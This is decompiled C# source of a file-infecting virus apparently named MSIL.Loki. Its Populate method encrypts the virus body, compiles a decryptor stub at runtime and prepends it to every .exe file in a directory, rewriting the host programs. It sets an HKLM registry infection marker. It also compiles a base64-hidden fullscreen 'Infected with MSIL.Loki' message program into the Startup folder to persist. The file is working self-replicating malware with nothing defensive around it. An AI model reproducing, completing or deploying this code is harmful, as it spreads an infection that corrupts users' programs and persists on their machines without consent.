using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;
using Microsoft.Win32;

namespace Loki;

internal class Loki
{
	private int encm = 0;

	private string k = null;

	private string iv = null;

	public void Populate(string dir)
	{
		if (!Directory.Exists(dir))
		{
			return;
		}
		string[] files = Directory.GetFiles(dir, "*.exe");
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				byte[] array = read(files[i]);
				if (array[60] == 128)
				{
					continue;
				}
				Random random = new Random();
				random.Next(1000);
				string d = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);
				string text = Directory.GetCurrentDirectory() + "\\" + Rand() + ".exe";
				string text2 = Directory.GetCurrentDirectory() + "\\" + Rand() + DateTime.Now.Year + ".exe";
				byte[] array2 = read(d);
				FileStream fileStream = new FileStream(text, FileMode.CreateNew);
				BinaryWriter binaryWriter = new BinaryWriter(fileStream);
				for (int j = 0; j < array2.Length; j++)
				{
					binaryWriter.BaseStream.WriteByte(array2[j]);
				}
				binaryWriter.Close();
				fileStream.Close();
				Encrypt(text, text2, encm);
				if (!File.Exists(text2))
				{
					continue;
				}
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				FileInfo fileInfo = new FileInfo(files[i]);
				int num = (int)fileInfo.Length;
				string text3 = Decryptor(text2, 5632, num + 5632, encm);
				if (File.Exists(text3))
				{
					byte[] array3 = read(text3);
					byte[] array4 = read(text2);
					if (File.Exists(files[i]))
					{
						File.Delete(files[i]);
						FileStream fileStream2 = new FileStream(files[i], FileMode.CreateNew);
						BinaryWriter binaryWriter2 = new BinaryWriter(fileStream2);
						for (int j = 0; j < array3.Length; j++)
						{
							binaryWriter2.BaseStream.WriteByte(array3[j]);
						}
						for (int k = 0; k < array.Length; k++)
						{
							binaryWriter2.BaseStream.WriteByte(array[k]);
						}
						for (int l = 0; l < array4.Length; l++)
						{
							binaryWriter2.BaseStream.WriteByte(array4[l]);
						}
						binaryWriter2.Close();
						fileStream2.Close();
						File.Delete(text2);
						File.Delete(text3);
					}
				}
				else if (File.Exists(text2))
				{
					File.Delete(text2);
				}
			}
			catch
			{
			}
		}
	}

	public byte[] read(string d)
	{
		FileStream fileStream = new FileStream(d, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		byte[] array = new byte[fileStream.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = binaryReader.ReadByte();
		}
		binaryReader.Close();
		fileStream.Close();
		return array;
	}

	public void Encrypt(string inf, string outf, int e)
	{
		if (e == 1)
		{
			try
			{
				string text = getKey();
				if (text.Length > 8)
				{
					text = text.Substring(0, 8);
				}
				else if (text.Length < 8)
				{
					int num = 8 - text.Length;
					for (int i = 0; i < num; i++)
					{
						text += i;
					}
				}
				UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
				byte[] bytes = unicodeEncoding.GetBytes(text);
				FileStream fileStream = new FileStream(outf, FileMode.Create);
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
				FileStream fileStream2 = new FileStream(inf, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Close();
				cryptoStream.Close();
				fileStream.Close();
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			byte[] buffer = read(inf);
			byte[] bytes = Convert.FromBase64String(getKey());
			byte[] rgbIV = Convert.FromBase64String(getIV());
			FileStream fileStream3 = File.Open(outf, FileMode.OpenOrCreate);
			CryptoStream cryptoStream = new CryptoStream(fileStream3, new TripleDESCryptoServiceProvider().CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			BinaryWriter binaryWriter = new BinaryWriter(cryptoStream);
			binaryWriter.Write(buffer);
			binaryWriter.Close();
			cryptoStream.Close();
			fileStream3.Close();
		}
		catch
		{
		}
	}

	public string Decryptor(string f, int num, int hl, int e)
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_02fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		string text = Directory.GetCurrentDirectory() + "\\" + Rand() + DateTime.Now.Year + ".exe";
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		CompilerParameters val2 = new CompilerParameters();
		val2.get_ReferencedAssemblies().Add("System.dll");
		val2.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val2.set_GenerateExecutable(true);
		val2.set_CompilerOptions("/target:winexe");
		val2.set_OutputAssembly(text);
		Random random = new Random();
		string text2 = Rand() + random.Next(100);
		string text3 = Rand() + hl;
		string text4 = Rand() + random.Next(hl);
		string text5 = "\nusing System; \nusing System.Windows.Forms; \nusing System.Security.Cryptography; \nusing System.Text; \nusing System.Diagnostics; \nusing System.IO; \nusing System.Threading; \nnamespace " + text2 + " { \n   class " + text2 + text3 + ": Form { \n       static string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); \n       static string inf = @\"" + f + "\"; \n       static string outf = @\"" + text3 + ".exe\"; \n       static string tmp = @\"" + text3 + text4 + ".exe\"; \n";
		string text6;
		if (e == 1)
		{
			text5 = text5 + "static string p = @\"" + getKey() + "\"; \n";
		}
		else
		{
			text6 = text5;
			text5 = text6 + "static byte[] Key = Convert.FromBase64String(\"" + getKey() + "\"); \nstatic byte[] IV  = Convert.FromBase64String(\"" + getIV() + "\"); \n";
		}
		object obj = text5;
		text5 = string.Concat(obj, "  public static void Main() { \n             ", text4, "(); \n       } \n       private static void ", text4, "() { \n           try { \n                FileStream fs = new FileStream(cf, FileMode.Open, FileAccess.Read); \n               BinaryReader brb = new BinaryReader(fs); \n               byte[] b = new byte[fs.Length]; \n               for (int q = 0; q < b.Length; q++) { \n                   b[q] = brb.ReadByte(); \n               } \n               brb.Close(); \n               fs.Close(); \n               FileStream fsb = new FileStream(tmp, FileMode.CreateNew); \n               BinaryWriter bwb = new BinaryWriter(fsb); \n               for (int z = ", num, "; z < ", hl, "; z++) { \n                    bwb.BaseStream.WriteByte(b[z]); \n               } \n                fsb.Close(); \n               bwb.Close(); \n               File.SetAttributes(tmp, FileAttributes.Hidden); \n               try { \n                   Process.Start(tmp).WaitForExit(); \n                   File.Delete(tmp); \n               } catch { } \n               FileStream fb = new FileStream(inf, FileMode.CreateNew); \n               BinaryWriter bw = new BinaryWriter(fb); \n               for (int z = ", hl, "; z < b.Length; z++) { \n                    bw.BaseStream.WriteByte(b[z]); \n               } \n                fb.Close(); \n               bw.Close(); \n               File.SetAttributes(inf, FileAttributes.Hidden); \n");
		text5 = ((e != 1) ? (text5 + "      FileStream fr = new FileStream(inf, FileMode.Open); \n      CryptoStream cs = new CryptoStream(fr, new TripleDESCryptoServiceProvider().CreateDecryptor(Key, IV), CryptoStreamMode.Read); \n      if(File.Exists(outf)) { \n          File.Delete(outf); \n      } \n      FileStream o = new FileStream(outf, FileMode.Create); \n      int data; \n       while((data = cs.ReadByte()) != -1) { \n          o.WriteByte((byte)data); \n      } \n      o.Close(); \n      cs.Close(); \n      fr.Close(); \n") : (text5 + "      if(p.Length > 8) { \n          p = p.Substring(0,8); \n      } else if(p.Length < 8) { \n          int a = 8 - p.Length; \n          for(int i = 0; i < a; i++) \n              p = p + i; \n      } \n      UnicodeEncoding UE = new UnicodeEncoding(); \n      byte[] k = UE.GetBytes(p); \n      FileStream fr = new FileStream(inf, FileMode.Open); \n      RijndaelManaged r = new RijndaelManaged(); \n      CryptoStream cs = new CryptoStream(fr, r.CreateDecryptor(k, k), CryptoStreamMode.Read); \n      if(File.Exists(outf)) { \n          File.Delete(outf); \n      } \n      FileStream o = new FileStream(outf, FileMode.Create); \n      int data; \n      while((data = cs.ReadByte()) != -1) { \n          o.WriteByte((byte)data); \n      } \n      o.Close(); \n      cs.Close(); \n      fr.Close(); \n"));
		text6 = text5;
		text5 = text6 + "          if(File.Exists(inf)) { \n                   File.Delete(inf); \n               } \n               Thread t = new Thread(new ThreadStart(" + text4 + text3 + ")); \n               t.Start(); \n           } catch (Exception er) { \n  \n } \n       } \n       private static void " + text4 + text3 + "() { \n           try { \n               Process.Start(outf).WaitForExit(); \n               File.Delete(outf); \n           } catch { } \n       } \n       \n   } \n} \n";
		CompilerResults val3 = val.CompileAssemblyFromSource(val2, text5);
		if (((CollectionBase)(object)val3.get_Errors()).Count > 0)
		{
			string text7 = "Compilation failed:\n";
			foreach (CompilerError item in (CollectionBase)(object)val3.get_Errors())
			{
				CompilerError val4 = item;
				text7 = text7 + ((object)val4).ToString() + "\n";
			}
			Console.WriteLine("There were compilation errors");
			Console.WriteLine(text7);
		}
		if (File.Exists(text))
		{
			File.SetAttributes(text, FileAttributes.Hidden);
		}
		return text;
	}

	public string Rand()
	{
		string text = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
		Random random = new Random();
		string text2 = "";
		for (int i = 0; i < random.Next(100); i++)
		{
			text2 += text[random.Next(text.Length)];
		}
		return text2;
	}

	public void Generatekey(int e)
	{
		if (e == 1)
		{
			DESCryptoServiceProvider dESCryptoServiceProvider = (DESCryptoServiceProvider)DES.Create();
			setKey(Encoding.ASCII.GetString(dESCryptoServiceProvider.Key));
			setEncm(e);
		}
		else
		{
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			setKey(Convert.ToBase64String(tripleDESCryptoServiceProvider.Key));
			setIV(Convert.ToBase64String(tripleDESCryptoServiceProvider.IV));
			setEncm(e);
		}
	}

	public bool Check()
	{
		string text = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Loki", "Loki", "Loki");
		if (text == "Loki")
		{
			return true;
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software", writable: true);
		RegistryKey registryKey2 = registryKey.CreateSubKey("Loki");
		registryKey2.SetValue("Loki", "Loki");
		return false;
	}

	public void GenerateMsg()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		CompilerParameters val2 = new CompilerParameters();
		Random random = new Random();
		string outputAssembly = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + random.Next(100000) + ".exe";
		val2.get_ReferencedAssemblies().Add("System.dll");
		val2.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val2.get_ReferencedAssemblies().Add("System.Data.dll");
		val2.get_ReferencedAssemblies().Add("System.Drawing.dll");
		val2.set_GenerateExecutable(true);
		val2.set_CompilerOptions("/target:winexe");
		val2.set_OutputAssembly(outputAssembly);
		string text = DeCode("dXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7IAp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7IAp1c2luZyBTeXN0ZW0uRGF0YTsgCnVzaW5nIFN5c3RlbS5EcmF3aW5nOyAKdXNpbmcgU3lzdGVtLlRleHQ7IAp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsgCm5hbWVzcGFjZSBzY3IgeyAKc3RhdGljIGNsYXNzIFByb2dyYW0gewogICBbU1RBVGhyZWFkXQogICBzdGF0aWMgdm9pZCBNYWluKCkgewpBcHBsaWNhdGlvbi5FbmFibGVWaXN1YWxTdHlsZXMoKTsKQXBwbGljYXRpb24uU2V0Q29tcGF0aWJsZVRleHRSZW5kZXJpbmdEZWZhdWx0KGZhbHNlKTsKQXBwbGljYXRpb24uUnVuKG5ldyBGb3JtMSgpKTsgCn0gCn0gCnBhcnRpYWwgY2xhc3MgRm9ybTEgewpwcml2YXRlIFN5c3RlbS5Db21wb25lbnRNb2RlbC5JQ29udGFpbmVyIGNvbXBvbmVudHMgPSBudWxsOwpwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBEaXNwb3NlKGJvb2wgZGlzcG9zaW5nKSB7CmlmIChkaXNwb3NpbmcgJiYgKGNvbXBvbmVudHMgIT0gbnVsbCkpIHsKY29tcG9uZW50cy5EaXNwb3NlKCk7Cn0KYmFzZS5EaXNwb3NlKGRpc3Bvc2luZyk7Cn0KcHJpdmF0ZSB2b2lkIEluaXRpYWxpemVDb21wb25lbnQoKSB7CnRoaXMuY29tcG9uZW50cyA9IG5ldyBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuQ29udGFpbmVyKCk7CnRoaXMubGFiZWwxID0gbmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsKCk7CnRoaXMudGltZXIxID0gbmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlRpbWVyKHRoaXMuY29tcG9uZW50cyk7CnRoaXMuU3VzcGVuZExheW91dCgpOwp0aGlzLmxhYmVsMS5BdXRvU2l6ZSA9IHRydWU7CnRoaXMubGFiZWwxLkJhY2tDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNvbG9yLkJsYWNrOwp0aGlzLmxhYmVsMS5Gb250ID0gbmV3IFN5c3RlbS5EcmF3aW5nLkZvbnQoIk1pY3Jvc29mdCBTYW5zIFNlcmlmIiwgMjRGLCBTeXN0ZW0uRHJhd2luZy5Gb250U3R5bGUuUmVndWxhciwgU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NVbml0LlBvaW50LCAoKGJ5dGUpKDApKSk7CnRoaXMubGFiZWwxLkZvcmVDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNvbG9yLlJlZDsKdGhpcy5sYWJlbDEuTG9jYXRpb24gPSBuZXcgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMTIsIDIwMSk7CnRoaXMubGFiZWwxLk5hbWUgPSAibGFiZWwxIjsKdGhpcy5sYWJlbDEuU2l6ZSA9IG5ldyBTeXN0ZW0uRHJhd2luZy5TaXplKDAsIDM3KTsKdGhpcy5sYWJlbDEuVGFiSW5kZXggPSAwOwp0aGlzLnRpbWVyMS5UaWNrICs9IG5ldyBTeXN0ZW0uRXZlbnRIYW5kbGVyKHRoaXMudGltZXIxX1RpY2spOwp0aGlzLkF1dG9TY2FsZURpbWVuc2lvbnMgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZUYoNkYsIDEzRik7CnRoaXMuQXV0b1NjYWxlTW9kZSA9IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkF1dG9TY2FsZU1vZGUuRm9udDsKdGhpcy5CYWNrZ3JvdW5kSW1hZ2VMYXlvdXQgPSBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5JbWFnZUxheW91dC5TdHJldGNoOwp0aGlzLkNsaWVudFNpemUgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0NzIsIDQ1OSk7CnRoaXMuQ29udHJvbHMuQWRkKHRoaXMubGFiZWwxKTsKdGhpcy5Eb3VibGVCdWZmZXJlZCA9IHRydWU7CnRoaXMuRm9ybUJvcmRlclN0eWxlID0gU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybUJvcmRlclN0eWxlLk5vbmU7CnRoaXMuTmFtZSA9ICJGb3JtMSI7CnRoaXMuU2hvd0luVGFza2JhciA9IGZhbHNlOwp0aGlzLlRvcE1vc3QgPSB0cnVlOwp0aGlzLldpbmRvd1N0YXRlID0gU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybVdpbmRvd1N0YXRlLk1heGltaXplZDsKdGhpcy5Mb2FkICs9IG5ldyBTeXN0ZW0uRXZlbnRIYW5kbGVyKHRoaXMuRm9ybTFfTG9hZF8xKTsKdGhpcy5SZXN1bWVMYXlvdXQoZmFsc2UpOwp0aGlzLlBlcmZvcm1MYXlvdXQoKTsKfQpwcml2YXRlIFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsIGxhYmVsMTsKcHJpdmF0ZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5UaW1lciB0aW1lcjE7Cn0gCnB1YmxpYyBwYXJ0aWFsIGNsYXNzIEZvcm0xIDogRm9ybSB7IApwdWJsaWMgRm9ybTEoKSB7IApJbml0aWFsaXplQ29tcG9uZW50KCk7IAp9IApwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBPblBhaW50QmFja2dyb3VuZChQYWludEV2ZW50QXJncyBlKSB7IAplLkdyYXBoaWNzLkRyYXdSZWN0YW5nbGUobmV3IFBlbihDb2xvci5CbGFjayksIDAsIDAsIFNpemUuV2lkdGgsIFNpemUuSGVpZ2h0KTsgCn0gCnByaXZhdGUgdm9pZCBGb3JtMV9Mb2FkXzEob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsgCnRoaXMuU2V0U3R5bGUoQ29udHJvbFN0eWxlcy5PcHRpbWl6ZWREb3VibGVCdWZmZXIgfCBDb250cm9sU3R5bGVzLlVzZXJQYWludCB8IENvbnRyb2xTdHlsZXMuQWxsUGFpbnRpbmdJbldtUGFpbnQsIHRydWUpOyAKdGhpcy5DYXB0dXJlID0gdHJ1ZTsgCkN1cnNvci5IaWRlKCk7IApCb3VuZHMgPSBTY3JlZW4uUHJpbWFyeVNjcmVlbi5Cb3VuZHM7IApXaW5kb3dTdGF0ZSA9IEZvcm1XaW5kb3dTdGF0ZS5NYXhpbWl6ZWQ7IApTaG93SW5UYXNrYmFyID0gZmFsc2U7IApEb3VibGVCdWZmZXJlZCA9IHRydWU7IApCYWNrZ3JvdW5kSW1hZ2VMYXlvdXQgPSBJbWFnZUxheW91dC5TdHJldGNoOyAKdGltZXIxLkludGVydmFsID0gMTAwMDsgCnRpbWVyMS5TdGFydCgpOyAKfSAKcHJpdmF0ZSB2b2lkIHNjcm9sbCgpIHsgCmxhYmVsMS5UZXh0ID0gIkluZmVjdGVkIHdpdGggTVNJTC5Mb2tpIGJ5IGZyZWUwbiB8IERvb21SaWRlcnoiOyAKUmFuZG9tIHIgPSBuZXcgUmFuZG9tKCk7IApsYWJlbDEuU2V0Qm91bmRzKHIuTmV4dCgxMDApLCByLk5leHQoMTAwMCksIHIuTmV4dCgxMDAwKSwgci5OZXh0KDEwMDApKTsKfQpwcml2YXRlIHZvaWQgdGltZXIxX1RpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsKc2Nyb2xsKCk7Cn0KfSAKfSAK");
		val.CompileAssemblyFromSource(val2, text);
	}

	public void Send()
	{
	}

	private string DeCode(string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	public string getKey()
	{
		return k;
	}

	public void setKey(string key)
	{
		k = key;
	}

	public string getIV()
	{
		return iv;
	}

	public void setIV(string i)
	{
		iv = i;
	}

	public int getEncm()
	{
		return encm;
	}

	public void setEncm(int s)
	{
		encm = s;
	}
}
